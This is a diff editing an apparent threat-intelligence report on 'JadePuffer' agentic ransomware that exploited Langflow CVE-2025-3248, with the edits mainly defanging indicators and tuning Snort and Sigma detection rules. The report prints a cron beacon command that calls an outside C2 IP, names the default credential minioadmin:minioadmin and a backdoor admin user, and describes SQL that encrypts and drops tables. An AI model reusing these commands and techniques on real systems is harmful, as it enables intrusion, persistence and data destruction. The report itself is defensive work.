@@ -3,7 +3,7 @@
 Prepared by: Actioner
 Classification: TLP:WHITE
 Date: 2026-07-06
-Version: 1.0 (DRAFT)
+Version: 1.0
 
 ## Executive Summary
 
@@ -59,7 +59,7 @@ When the MinIO API returned XML instead of expected JSON (the agent had queried 
 
 **Persistence**: A cron job was installed on the Langflow server:
 ```
-*/30 * * * * python3 -c "import urllib.request;urllib.request.urlopen('http://45.131.66.106:4444/beacon',timeout=5)"
+*/30 * * * * python3 -c "import urllib.request;urllib.request.urlopen('hxxp://45.131.66[.]106:4444/beacon',timeout=5)"
 ```
 This established a simple HTTP GET beacon to C2 infrastructure every 30 minutes.
 
@@ -153,7 +153,7 @@ The agent also probed the `mysql.func` table for User Defined Functions (UDF) es
 
 ### Behavioral
 
-- **Cron persistence**: `*/30 * * * *` cron entry executing `python3 -c "import urllib.request;urllib.request.urlopen('http://45.131.66.106:4444/beacon',timeout=5)"`
+- **Cron persistence**: `*/30 * * * *` cron entry executing `python3 -c "import urllib.request;urllib.request.urlopen('hxxp://45.131.66[.]106:4444/beacon',timeout=5)"`
 - **MinIO default credential abuse**: Authentication using `minioadmin:minioadmin` against internal MinIO endpoints
 - **Nacos backdoor admin**: Creation of user `xadmin` with `ROLE_ADMIN` via direct database manipulation
 - **Database encryption pattern**: `CREATE TABLE ... AS SELECT ... AES_ENCRYPT(content, key) ... FROM config_info` followed by `DROP TABLE config_info`
@@ -179,7 +179,7 @@ The agent also probed the `mysql.func` table for User Defined Functions (UDF) es
 | T1486 | Data Encrypted for Impact | AES encryption of 1,342 Nacos configuration items via MySQL AES_ENCRYPT() |
 | T1485 | Data Destruction | Dropping config_info, his_config_info tables and entire database schemas |
 | T1565.001 | Stored Data Manipulation | README_RANSOM table creation with extortion demand replacing original data |
-| T1041 | Exfiltration Over C2 Channel | Claimed (but unverified) data exfiltration to staging server 64.20.53[.]230 |
+| T1041 | Exfiltration Over C2 Channel | Claimed (unconfirmed) data exfiltration to staging server 64.20.53[.]230 -- ransom note asserted backup but no network evidence of data transfer was observed |
 
 ## Impact Assessment
 
@@ -229,7 +229,7 @@ grep -r '/api/v1/validate/code' /var/log/nginx/ /var/log/apache2/ /var/log/httpd
 - Implement runtime threat detection for database process anomalies
 - Apply egress controls preventing compromised application hosts from reaching external databases/staging servers
 - Monitor for MinIO default credential usage (`minioadmin:minioadmin`)
-- Deploy web application firewalls with rules for Langflow exploitation patterns
+- Deploy web application firewalls blocking unauthenticated HTTP POST requests to `/api/v1/validate/code` from non-trusted sources
 - Implement network segmentation between AI/ML infrastructure and production databases
 
 ## Detection Rules
@@ -406,7 +406,7 @@ detection:
     condition: selection
 falsepositives:
     - Legitimate connections to InterServer (AS19318) hosted services at this IP
-level: high
+level: medium
 ```
 
 ### Snort: JadePuffer C2 Beacon Traffic
@@ -426,7 +426,7 @@ Detects HTTP POST requests to the Langflow `/api/v1/validate/code` endpoint asso
 <!-- audit: snort -T exit 0 (Snort 2.9.20). Matches POST + URI pattern in TCP payload. Legitimate Langflow dev traffic can match; medium confidence. -->
 
 ```snort
-alert tcp any any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - Langflow CVE-2025-3248 Code Validation RCE Attempt"; flow:established,to_server; content:"POST"; depth:4; content:"/api/v1/validate/code"; fast_pattern; nocase; classtype:web-application-attack; reference:url,sysdig.com/blog/jadepuffer-agentic-ransomware-for-automated-database-extortion; reference:cve,2025-3248; metadata:author Actioner, created 2026-07-06; sid:2100011; rev:1;)
+alert tcp any any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - Langflow CVE-2025-3248 Code Validation RCE Attempt"; flow:established,to_server; content:"POST"; depth:4; content:"/api/v1/validate/code"; fast_pattern; classtype:web-application-attack; reference:url,sysdig.com/blog/jadepuffer-agentic-ransomware-for-automated-database-extortion; reference:cve,2025-3248; metadata:author Actioner, created_at 2026-07-06; sid:2100011; rev:1;)
 ```
 
 ### Suricata: JadePuffer C2 HTTP Beacon
